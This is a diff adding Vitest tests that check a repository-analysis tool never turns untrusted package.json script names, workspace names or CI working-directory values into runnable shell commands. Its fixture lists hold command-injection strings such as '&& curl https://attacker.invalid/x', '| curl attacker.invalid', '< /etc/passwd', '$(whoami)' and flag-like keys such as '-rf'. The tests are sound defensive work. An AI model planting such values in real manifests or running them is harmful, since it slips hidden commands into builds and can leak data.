@@ -2400,3 +2400,233 @@ describe("Final-2 P1-5: convention trust boundary is subject/domain-based", () =
     }
   });
 });
+
+// ---------------------------------------------------------------------------
+// Final-3 remediation P1-1 — untrusted metadata can never synthesize shell syntax
+// ---------------------------------------------------------------------------
+
+import { isPositionalSafeValue, pathRelativeToAnalysisRoot } from "../src/core/codebase/extract.js";
+
+const manager = (name: "npm" | "pnpm" | "yarn" | "bun" = "npm") => ({
+  name,
+  evidence: "package-lock.json in the analyzed root directory (lockfile)",
+  lockfilePresent: true,
+});
+
+describe("Final-3 P1-1: script names cannot inject shell syntax", () => {
+  const HOSTILE_SCRIPT_KEYS = [
+    "test && curl https://attacker.invalid/x",
+    "test; touch /tmp/x",
+    "test$(whoami)",
+    "test`whoami`",
+    "test name",
+    'test"quoted',
+    "test'quoted",
+    "test | curl attacker.invalid",
+    "test > /tmp/owned",
+    "test < /etc/passwd",
+    "test\nwhoami",
+    "test & curl attacker.invalid",
+    "-rf", // would become a flag, not a script name
+    "--help",
+  ];
+
+  it("unsafe script keys emit NO runnable command through any manager", () => {
+    for (const m of ["npm", "pnpm", "yarn", "bun"] as const) {
+      for (const key of HOSTILE_SCRIPT_KEYS) {
+        const { commands, scriptDefinitions } = commandsFromPackageJson(
+          [pkg({ [key]: "echo harmless" })],
+          manager(m),
+        );
+        const joined = commands.map((c) => c.command).join(" || ");
+        expect(joined, `${m} + script key ${JSON.stringify(key)}`).toBe("");
+        // The original fact survives as non-runnable evidence — it is not
+        // silently dropped, and it is never rendered as a command.
+        expect(scriptDefinitions.some((d) => d.evidence.includes(`scripts.${key}`) || d.command === ""), key).toBe(true);
+        expect(commands.length, key).toBe(0);
+      }
+    }
+  });
+
+  it("shell metacharacters never appear inside any emitted command string", () => {
+    for (const key of HOSTILE_SCRIPT_KEYS) {
+      const { commands } = commandsFromPackageJson([pkg({ [key]: "echo harmless" })], manager("npm"));
+      for (const c of commands) {
+        // No command may contain the raw unsafe value or shell operators
+        // adjacent to untrusted content.
+        expect(c.command).not.toContain("&&");
+        expect(c.command).not.toContain(key);
+      }
+    }
+  });
+
+  it("safe script keys keep their legitimate runnable forms", () => {
+    const { commands } = commandsFromPackageJson(
+      [pkg({ test: "vitest run", "test:unit": "vitest --run src", lint: "eslint .", build: "tsc", typecheck: "tsc --noEmit" })],
+      manager("npm"),
+    );
+    const byEvidence = Object.fromEntries(commands.map((c) => [c.evidence, c.command]));
+    expect(byEvidence['package.json scripts.test = "vitest run"']).toBe("npm test");
+    expect(byEvidence['package.json scripts.test:unit = "vitest --run src"']).toBe("npm run test:unit");
+    expect(byEvidence['package.json scripts.lint = "eslint ."']).toBe("npm run lint");
+    expect(byEvidence['package.json scripts.build = "tsc"']).toBe("npm run build");
+    expect(byEvidence['package.json scripts.typecheck = "tsc --noEmit"']).toBe("npm run typecheck");
+  });
+
+  it("synthesized script commands are marked synthesized with concrete root cwd", () => {
+    const { commands } = commandsFromPackageJson([pkg({ test: "vitest run" })], manager("npm"));
+    expect(commands[0]!.synthesized).toBe(true);
+    expect(commands[0]!.cwd).toBe("");
+  });
+
+  it("isPositionalSafeValue is the documented gate", () => {
+    for (const safe of ["test", "test:unit", "lint", "build", "typecheck", "@scope/pkg", "pkg.name", "pkg_name", "pkg-name", "packages/web"]) {
+      expect(isPositionalSafeValue(safe), safe).toBe(true);
+    }
+    for (const unsafe of HOSTILE_SCRIPT_KEYS.concat(["", "a b", "a/b c"])) {
+      expect(isPositionalSafeValue(unsafe), JSON.stringify(unsafe)).toBe(false);
+    }
+  });
+});
+
+describe("Final-3 P1-1: workspace names cannot inject shell/argv syntax", () => {
+  const HOSTILE_WORKSPACE_NAMES = [
+    "web && curl attacker.invalid",
+    "@scope/pkg", // documented safe shape — asserted safe below, listed here for contrast in fixture builders
+    "pkg name",
+    "--help",
+    "$(whoami)",
+    "`whoami`",
+    "a;curl",
+    "a|b",
+    'x"y',
+    "x'y",
+    "x\ny",
+  ];
+
+  function fixtureWithWorkspace(name: string, managerName: "npm" | "pnpm" | "yarn" | "bun") {
+    return commandsFromPackageJson(
+      [
+        { path: "package.json", content: JSON.stringify({ name: "root", workspaces: ["packages/*"] }) },
+        { path: "packages/web/package.json", content: JSON.stringify({ name, scripts: { test: "web-test" } }) },
+      ],
+      manager(managerName),
+      {
+        rootManifestPath: "package.json",
+        workspaceNames: new Map([["packages/web/package.json", name]]),
+      },
+    );
+  }
+
+  it("workspace names with shell-significant characters or whitespace produce NO runnable command", () => {
+    for (const name of ["web && curl attacker.invalid", "pkg name", "--help", "$(whoami)", "`whoami`", "a;curl", "a|b", 'x"y', "x'y", "x\ny"]) {
+      for (const m of ["npm", "pnpm", "yarn"] as const) {
+        const { commands } = fixtureWithWorkspace(name, m);
+        expect(commands.map((c) => c.command).join(" || "), `${m} + workspace ${JSON.stringify(name)}`).toBe("");
+      }
+    }
+  });
+
+  it("safe package names keep their grounded selector forms", () => {
+    const pnpm = fixtureWithWorkspace("@scope/web", "pnpm");
+    expect(pnpm.commands.find((c) => c.purpose === "test")?.command).toBe("pnpm --filter @scope/web run test");
+    const yarn = fixtureWithWorkspace("web", "yarn");
+    expect(yarn.commands.find((c) => c.purpose === "test")?.command).toBe("yarn workspace web run test");
+    const npm = fixtureWithWorkspace("web", "npm");
+    expect(npm.commands.find((c) => c.purpose === "test")?.command).toBe("npm run test --workspace web");
+    const bun = fixtureWithWorkspace("web", "bun");
+    expect(bun.commands.find((c) => c.purpose === "test")?.command).toBe("bun --cwd packages/web run test");
+  });
+
+  it("the end-to-end extraction path grounds hostile workspace names to nothing", () => {
+    // The hostile nested manifest name flows through groundWorkspaceMembership;
+    // no selector form may exist for it.
+    const analysis = buildRepositoryAnalysisFromCommandsFixture({
+      packageJson: JSON.stringify({ name: "root", workspaces: ["packages/*"] }),
+      nested: [{ path: "packages/web/package.json", name: "web && curl attacker.invalid", scripts: { test: "web-test" } }],
+      treeLockfiles: ["package-lock.json"],
+    });
+    expect(analysis.commands.filter((c) => c.evidence.includes("(workspace"))).toEqual([]);
+    // The hostile name must not appear in ANY command.
+    for (const c of analysis.commands) {
+      expect(c.command.includes("curl") || c.command.includes("&&"), c.command).toBe(false);
+    }
+  });
+
+  it("workspace membership + unsafe cwd characters fail closed for bun --cwd", () => {
+    // A manifest dir is derived from its path; a path containing shell
+    // metacharacters must never be embedded into `bun --cwd <dir>`.
+    const { commands } = commandsFromPackageJson(
+      [
+        { path: "package.json", content: JSON.stringify({ name: "root" }) },
+        { path: "packages/we b/package.json", content: JSON.stringify({ name: "web", scripts: { test: "t" } }) },
+      ],
+      manager("bun"),
+      {
+        rootManifestPath: "package.json",
+        workspaceNames: new Map([["packages/we b/package.json", "web"]]),
+      },
+    );
+    expect(commands.map((c) => c.command).join(" || ")).toBe("");
+  });
+});
+
+describe("Final-3 P1-1: cwd/path values cannot inject shell syntax", () => {
+  const HOSTILE_CWD = ["dir with spaces", "a;b", "a&&b", "$(whoami)", "`whoami`", 'quo"te', "quo'te", "-leading-dash", "a\nb", "a|b"];
+
+  it("unsafe step-level CI cwd values yield NO runnable command", () => {
+    for (const cwd of HOSTILE_CWD) {
+      const cmds = commandsFromCiWorkflows([
+        {
+          path: ".github/workflows/ci.yml",
+          content: yamlStringify({
+            name: "ci",
+            on: "push",
+            jobs: { b: { steps: [{ run: "npm ci", "working-directory": cwd }] } },
+          }),
+        },
+      ]);
+      expect(cmds.map((c) => c.command).join(" || "), JSON.stringify(cwd)).toBe("");
+    }
+  });
+
+  it("unsafe defaults.run.working-directory values yield NO runnable command", () => {
+    for (const cwd of HOSTILE_CWD) {
+      const cmds = commandsFromCiWorkflows([
+        {
+          path: ".github/workflows/ci.yml",
+          content: yamlStringify({
+            name: "ci",
+            on: "push",
+            defaults: { run: { "working-directory": cwd } },
+            jobs: { b: { steps: [{ run: "npm ci" }] } },
+          }),
+        },
+      ]);
+      expect(cmds.map((c) => c.command).join(" || "), JSON.stringify(cwd)).toBe("");
+    }
+  });
+
+  it("safe cwd values still render the canonical cd form", () => {
+    const cmds = commandsFromCiWorkflows([
+      {
+        path: ".github/workflows/ci.yml",
+        content: yamlStringify({
+          name: "ci",
+          on: "push",
+          jobs: { b: { steps: [{ run: "npm ci", "working-directory": "packages/web" }] } },
+        }),
+      },
+    ]);
+    expect(cmds.find((c) => c.command === "cd packages/web && npm ci")).toBeTruthy();
+    expect(cmds[0]!.cwd).toBe("packages/web");
+    expect(cmds[0]!.synthesized ?? false).toBe(false); // directly observed command text
+  });
+
+  it("pathRelativeToAnalysisRoot never synthesizes values — it only splits observed paths", () => {
+    // Path splitting cannot create shell syntax: components come from the
+    // tree, and unsafe components fail isPositionalSafeValue downstream.
+    expect(pathRelativeToAnalysisRoot("packages/we b/package.json", "package.json")).toBe("packages/we b");
+    expect(isPositionalSafeValue("packages/we b")).toBe(false);
+  });
+});
